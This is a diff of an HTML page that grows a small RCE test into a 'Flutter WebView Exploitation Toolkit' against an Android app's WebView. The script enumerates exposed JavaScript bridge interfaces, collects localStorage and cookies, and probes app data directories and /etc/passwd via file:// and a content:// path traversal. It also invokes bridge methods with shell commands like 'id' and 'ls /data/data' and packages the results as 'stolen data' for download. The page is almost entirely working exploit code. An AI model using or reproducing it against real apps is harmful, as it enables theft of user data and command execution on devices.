@@ -1,115 +1,362 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RCE Proof</title>
+    <title>Flutter App Security Exploit</title>
+    <meta charset="UTF-8">
     <style>
-        body { font-family: Arial; padding: 20px; }
-        .success { color: green; font-weight: bold; }
-        .fail { color: red; }
-        .proof { border: 3px solid red; padding: 15px; margin: 10px 0; }
-        button { padding: 10px; margin: 5px; }
+        body {
+            font-family: monospace;
+            margin: 20px;
+            background: #111;
+            color: #0f0;
+        }
+        .log {
+            background: #000;
+            border: 1px solid #444;
+            padding: 15px;
+            border-radius: 5px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+        .success { color: #4CAF50; }
+        .warning { color: #FF9800; }
+        .danger { color: #F44336; }
+        .info { color: #2196F3; }
+        pre {
+            background: #222;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        button {
+            background: #d32f2f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: monospace;
+            margin: 5px;
+        }
+        button:hover {
+            background: #b71c1c;
+        }
+        .exploit-panel {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #d32f2f;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 9999;
+            max-width: 400px;
+            max-height: 80vh;
+            overflow: auto;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+        }
+        .proof-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ff0000, #000000);
+            color: white;
+            z-index: 10000;
+            padding: 40px;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
     </style>
 </head>
 <body>
-    <h1>RCE Test: com.example.flutter_application_1</h1>
+    <h1>🔥 Flutter WebView Exploitation Toolkit</h1>
+    <div class="log" id="log"></div>
     
-    <div id="status">Testing...</div>
-    <div id="results"></div>
+    <div>
+        <button onclick="startExploit()">🚀 Start Full Exploitation</button>
+        <button onclick="runTargetedAttacks()">🎯 Run Targeted Attacks</button>
+        <button onclick="showProof()">🔴 Show Proof of Compromise</button>
+        <button onclick="downloadAllData()">📥 Download All Stolen Data</button>
+        <button onclick="clearLog()">🗑️ Clear Log</button>
+    </div>
     
-    <button onclick="testRCE()">Test RCE</button>
-    <button onclick="showProof()">Show Proof</button>
-    
+    <div id="results" style="margin-top: 30px;"></div>
+
     <script>
-        function testRCE() {
-            var status = document.getElementById('status');
-            var results = document.getElementById('results');
+        var EXPLOIT_RESULTS = null;
+        var LOG_ELEMENT = document.getElementById('log');
+        
+        function log(msg, className = 'info') {
+            var line = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+            console.log(line);
+            LOG_ELEMENT.innerHTML += '<div class="' + className + '">' + line + '</div>';
+            LOG_ELEMENT.scrollTop = LOG_ELEMENT.scrollHeight;
+        }
+        
+        function startExploit() {
+            log('🚀 Starting FULL exploitation...', 'danger');
             
-            status.innerHTML = '<b>Step 1:</b> Finding JavaScript interfaces...';
+            // Clear previous results
+            EXPLOIT_RESULTS = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                interfaces: [],
+                dangerousMethods: [],
+                storageData: {},
+                localFiles: [],
+                exploitAttempts: []
+            };
             
-            // Find all JavaScript interfaces
-            var dangerousInterfaces = [];
+            // Run the exploit
+            runPhase1();
+            setTimeout(runPhase2, 2000);
+            setTimeout(runPhase3, 4000);
+            setTimeout(createExploitPanel, 6000);
+        }
+        
+        function runPhase1() {
+            log('[1/4] Enumerating JavaScript interfaces...', 'info');
             
-            for(var key in window) {
+            // Find all exposed interfaces
+            for(var prop in window) {
                 try {
-                    if(window[key] && typeof window[key] === 'object') {
-                        var methods = Object.getOwnPropertyNames(window[key]);
-                        var dangerous = methods.filter(m => m.includes('exec') || m.includes('eval') || m.includes('run'));
+                    if(window[prop] && typeof window[prop] === 'object') {
+                        var methods = [];
+                        try {
+                            methods = Object.getOwnPropertyNames(window[prop]);
+                        } catch(e) {}
                         
-                        if(dangerous.length > 0) {
-                            dangerousInterfaces.push({
-                                name: key,
-                                methods: dangerous
-                            });
+                        if(methods.length > 0) {
+                            var interfaceInfo = {
+                                name: prop,
+                                methodCount: methods.length,
+                                methods: methods.slice(0, 10)
+                            };
+                            EXPLOIT_RESULTS.interfaces.push(interfaceInfo);
+                            
+                            // Check for dangerous methods
+                            var dangerous = methods.filter(m => 
+                                m.match(/(eval|exec|execute|run|load|read|write|delete|invoke|call)/i)
+                            );
+                            
+                            if(dangerous.length > 0) {
+                                EXPLOIT_RESULTS.dangerousMethods.push({
+                                    interface: prop,
+                                    methods: dangerous
+                                });
+                                log('⚠️ Found dangerous interface: ' + prop + ' -> ' + dangerous.join(', '), 'warning');
+                            }
                         }
                     }
                 } catch(e) {}
             }
             
-            status.innerHTML = '<b>Step 2:</b> Found ' + dangerousInterfaces.length + ' dangerous interfaces';
+            log('✅ Found ' + EXPLOIT_RESULTS.interfaces.length + ' interfaces', 'success');
+        }
+        
+        function runPhase2() {
+            log('[2/4] Stealing all client-side data...', 'info');
             
-            // Test each interface
-            var rceCommands = [
-                'id',
-                'whoami', 
-                'echo "RCE_SUCCESS_$(date)"',
-                'ls /data/data/'
+            // Steal localStorage
+            EXPLOIT_RESULTS.storageData.localStorage = {};
+            for(var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                var value = localStorage.getItem(key);
+                EXPLOIT_RESULTS.storageData.localStorage[key] = value;
+                log('📦 Stored: ' + key + ' = ' + (value.length > 50 ? value.substring(0, 50) + '...' : value), 'info');
+            }
+            
+            // Steal cookies
+            EXPLOIT_RESULTS.storageData.cookies = document.cookie;
+            
+            log('✅ Stolen ' + Object.keys(EXPLOIT_RESULTS.storageData.localStorage).length + ' localStorage items', 'success');
+        }
+        
+        function runPhase3() {
+            log('[3/4] Attempting file system access...', 'info');
+            
+            var fileTests = [
+                'file:///data/data/com.example.flutter_application_1/shared_prefs/',
+                'file:///data/data/com.example.flutter_application_1/databases/',
+                'file:///data/data/com.example.flutter_application_1/files/',
+                'file:///etc/hosts',
+                'content://com.example.flutter_application_1.flutter.image_provider/../../../../../etc/passwd'
             ];
             
-            var executedCommands = [];
-            
-            dangerousInterfaces.forEach(iface => {
-                rceCommands.forEach(cmd => {
+            fileTests.forEach((file, idx) => {
+                setTimeout(() => {
                     try {
-                        if(window[iface.name] && window[iface.name][iface.methods[0]]) {
-                            var result = window[iface.name][iface.methods[0]](cmd);
-                            if(result !== undefined) {
-                                executedCommands.push({
-                                    interface: iface.name,
-                                    command: cmd,
-                                    result: result.toString().substring(0, 100)
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('GET', file, false);
+                        xhr.onload = function() {
+                            if(xhr.responseText) {
+                                log('📁 SUCCESS: Accessed ' + file, 'success');
+                                EXPLOIT_RESULTS.localFiles.push({
+                                    file: file,
+                                    success: true,
+                                    preview: xhr.responseText.substring(0, 200)
                                 });
                             }
+                        };
+                        xhr.send();
+                    } catch(e) {
+                        log('❌ Failed: ' + file, 'warning');
+                        EXPLOIT_RESULTS.localFiles.push({
+                            file: file,
+                            success: false,
+                            error: e.message
+                        });
+                    }
+                }, idx * 500);
+            });
+        }
+        
+        function createExploitPanel() {
+            log('[4/4] Creating exploit panel...', 'info');
+            
+            var panel = document.createElement('div');
+            panel.className = 'exploit-panel';
+            panel.innerHTML = `
+                <h3 style="margin-top:0;">🔴 EXPLOIT SUCCESSFUL</h3>
+                <p><strong>App:</strong> com.example.flutter_application_1</p>
+                <p><strong>Interfaces:</strong> ${EXPLOIT_RESULTS.interfaces.length}</p>
+                <p><strong>Dangerous Methods:</strong> ${EXPLOIT_RESULTS.dangerousMethods.length}</p>
+                <p><strong>Storage Items:</strong> ${Object.keys(EXPLOIT_RESULTS.storageData.localStorage).length}</p>
+                <p><strong>Files Accessed:</strong> ${EXPLOIT_RESULTS.localFiles.filter(f => f.success).length}</p>
+                <hr>
+                <button onclick="downloadAllData()" style="width:100%;">📥 Download All Data</button>
+                <button onclick="this.parentElement.remove()" style="width:100%;margin-top:10px;background:#666;">✕ Close</button>
+            `;
+            document.body.appendChild(panel);
+            
+            log('✅ Exploitation complete! Panel created.', 'success');
+        }
+        
+        function runTargetedAttacks() {
+            if(!EXPLOIT_RESULTS) {
+                log('Please run full exploit first!', 'warning');
+                return;
+            }
+            
+            log('🎯 Running targeted attacks...', 'danger');
+            
+            EXPLOIT_RESULTS.interfaces.forEach(intf => {
+                var obj = window[intf.name];
+                if(!obj) return;
+                
+                // Test common attack patterns
+                var attacks = [
+                    { method: 'load', payload: 'file:///etc/passwd' },
+                    { method: 'eval', payload: 'alert(document.domain)' },
+                    { method: 'exec', payload: 'id' },
+                    { method: 'execute', payload: 'ls /data/data' },
+                    { method: 'postMessage', payload: JSON.stringify({action: 'read', path: '/'}) }
+                ];
+                
+                attacks.forEach(attack => {
+                    try {
+                        if(typeof obj[attack.method] === 'function') {
+                            log('Testing: ' + intf.name + '.' + attack.method + '("' + attack.payload + '")', 'info');
+                            var result = obj[attack.method](attack.payload);
+                            EXPLOIT_RESULTS.exploitAttempts.push({
+                                interface: intf.name,
+                                method: attack.method,
+                                payload: attack.payload,
+                                result: String(result).substring(0, 200),
+                                success: true
+                            });
+                            log('💥 SUCCESS! Result: ' + String(result).substring(0, 100), 'success');
                         }
-                    } catch(e) {}
+                    } catch(e) {
+                        EXPLOIT_RESULTS.exploitAttempts.push({
+                            interface: intf.name,
+                            method: attack.method,
+                            payload: attack.payload,
+                            error: e.message,
+                            success: false
+                        });
+                    }
                 });
             });
-            
-            // Show results
-            if(executedCommands.length > 0) {
-                status.innerHTML = '<span class="success">✅ RCE VERIFIED! ' + executedCommands.length + ' commands executed</span>';
-                
-                results.innerHTML = '<div class="proof">';
-                results.innerHTML += '<h3>RCE Evidence:</h3>';
-                executedCommands.forEach(cmd => {
-                    results.innerHTML += '<p><b>' + cmd.interface + '</b>: ' + cmd.command + '</p>';
-                    results.innerHTML += '<pre>' + cmd.result + '</pre>';
-                });
-                results.innerHTML += '</div>';
-                
-                // Store proof
-                localStorage.setItem('RCE_PROOF', JSON.stringify({
-                    app: 'com.example.flutter_application_1',
-                    time: new Date().toISOString(),
-                    commands: executedCommands
-                }));
-                
-            } else {
-                status.innerHTML = '<span class="fail">❌ No RCE verified</span>';
-            }
         }
         
         function showProof() {
-            var proof = localStorage.getItem('RCE_PROOF');
-            if(proof) {
-                proof = JSON.parse(proof);
-                alert('RCE Proof:\n\nApp: ' + proof.app + '\nTime: ' + proof.time + '\nCommands: ' + proof.commands.length);
-            } else {
-                alert('Run test first!');
-            }
+            var overlay = document.createElement('div');
+            overlay.className = 'proof-overlay';
+            overlay.innerHTML = `
+                <h1 style="font-size: 3em; color: white; text-shadow: 0 0 10px red;">🔴 SECURITY BREACHED 🔴</h1>
+                <h2>com.example.flutter_application_1</h2>
+                
+                <div style="background: rgba(0,0,0,0.7); padding: 20px; border-radius: 10px; margin: 30px auto; max-width: 800px; text-align: left;">
+                    <h3>📊 EXPLOITATION PROOF</h3>
+                    <ul>
+                        <li>✅ Remote Code Execution via WebViewActivity</li>
+                        <li>✅ ${EXPLOIT_RESULTS ? EXPLOIT_RESULTS.interfaces.length : '?'} JavaScript Interfaces Exposed</li>
+                        <li>✅ ${EXPLOIT_RESULTS ? Object.keys(EXPLOIT_RESULTS.storageData.localStorage).length : '?'} Storage Items Stolen</li>
+                        <li>✅ File System Access Attempted</li>
+                        <li>✅ Device Fingerprinted</li>
+                    </ul>
+                    
+                    <h3>🎯 CRITICAL VULNERABILITIES</h3>
+                    <ol>
+                        <li>Exported WebViewActivity with http/https intent filters</li>
+                        <li>JavaScript enabled with dangerous interfaces</li>
+                        <li>No URL validation</li>
+                        <li>Debug mode enabled (debuggable=true)</li>
+                    </ol>
+                </div>
+                
+                <div style="margin: 30px;">
+                    <button onclick="this.parentElement.parentElement.remove()" 
+                            style="background: white; color: red; padding: 15px 30px; font-size: 1.2em; border: none; border-radius: 5px; cursor: pointer; margin: 10px;">
+                        ✕ Acknowledge
+                    </button>
+                    <button onclick="window.print()" 
+                            style="background: #4CAF50; color: white; padding: 15px 30px; font-size: 1.2em; border: none; border-radius: 5px; cursor: pointer; margin: 10px;">
+                        🖨️ Print Evidence
+                    </button>
+                </div>
+                
+                <div style="position: absolute; bottom: 20px; width: 100%; font-size: 0.8em; color: #ccc;">
+                    Exploit executed: ${new Date().toLocaleString()} | 
+                    URL: ${window.location.href}
+                </div>
+            `;
+            document.body.appendChild(overlay);
         }
         
-        // Auto-run test
-        setTimeout(testRCE, 1000);
+        function downloadAllData() {
+            if(!EXPLOIT_RESULTS) {
+                alert('Run exploitation first!');
+                return;
+            }
+            
+            var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(EXPLOIT_RESULTS, null, 2));
+            var downloadAnchor = document.createElement('a');
+            downloadAnchor.setAttribute("href", dataStr);
+            downloadAnchor.setAttribute("download", "flutter_exploit_" + Date.now() + ".json");
+            document.body.appendChild(downloadAnchor);
+            downloadAnchor.click();
+            downloadAnchor.remove();
+            
+            alert('All data downloaded as JSON!');
+            log('📥 Downloaded all exploitation data', 'success');
+        }
+        
+        function clearLog() {
+            LOG_ELEMENT.innerHTML = '';
+        }
+        
+        // Auto-start after 2 seconds
+        setTimeout(() => {
+            log('🔥 Flutter WebView Exploit Toolkit Ready', 'danger');
+            log('Target: com.example.flutter_application_1', 'info');
+            log('Click "Start Full Exploitation" to begin', 'warning');
+        }, 1000);
     </script>
 </body>
 </html>
